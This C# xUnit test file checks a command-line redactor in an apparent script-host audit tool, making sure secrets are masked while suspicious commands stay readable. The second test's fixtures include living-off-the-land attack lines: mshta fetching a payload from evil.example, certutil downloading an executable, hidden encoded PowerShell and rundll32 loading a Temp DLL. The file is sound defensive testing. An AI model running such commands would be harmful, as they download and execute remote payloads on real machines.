using Xunit;

namespace WatchLattice.ScriptHostAudit.Tests;

public sealed class CommandLineRedactorTests
{
    [Theory]
    [InlineData("powershell.exe -File deploy.ps1 -Password Hunter2", "powershell.exe -File deploy.ps1 -Password [hidden]")]
    [InlineData("tool.exe --token \"abc def\" --verbose", "tool.exe --token [hidden] --verbose")]
    [InlineData("cmd /c sqlcmd -U sa /p:S3cret!", "cmd /c sqlcmd -U sa /p:[hidden]")]
    [InlineData("curl https://api.example.com?api_key=12345&x=1", "curl https://api.example.com?api_key=[hidden]&x=1")]
    [InlineData("git clone https://me:ghp_abcdef@github.com/x/y", "git clone https://me:[hidden]@github.com/x/y")]
    [InlineData("curl -H \"Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.x.y\"", "curl -H \"Authorization: Bearer [hidden]\"")]
    [InlineData("powershell ConvertTo-SecureString 'P@ss' -AsPlainText -Force", "powershell ConvertTo-SecureString [hidden] -AsPlainText -Force")]
    [InlineData("azcopy copy x \"https://a.blob.core.windows.net/c?sv=2022&sig=AbC%2Bd\"", "azcopy copy x \"https://a.blob.core.windows.net/c?sv=2022&sig=[hidden]\"")]
    public void HidesLikelySecrets(string input, string expected)
    {
        var (text, hidden) = CommandLineRedactor.Redact(input);
        Assert.Equal(expected, text);
        Assert.True(hidden);
    }

    [Theory]
    // The evidence the audit exists for stays readable.
    [InlineData("powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgA")]
    [InlineData("mshta.exe https://evil.example/payload.hta")]
    [InlineData("certutil.exe -urlcache -split -f http://x/y.exe C:\\Users\\Public\\y.exe")]
    [InlineData("rundll32.exe C:\\Users\\me\\AppData\\Local\\Temp\\a.dll,DllRegisterServer")]
    [InlineData("powershell -Command \"Get-Item -Path C:\\passwords.txt\"")]
    public void LeavesOrdinaryCommandLinesAlone(string input)
    {
        var (text, hidden) = CommandLineRedactor.Redact(input);
        Assert.Equal(input, text);
        Assert.False(hidden);
    }
}
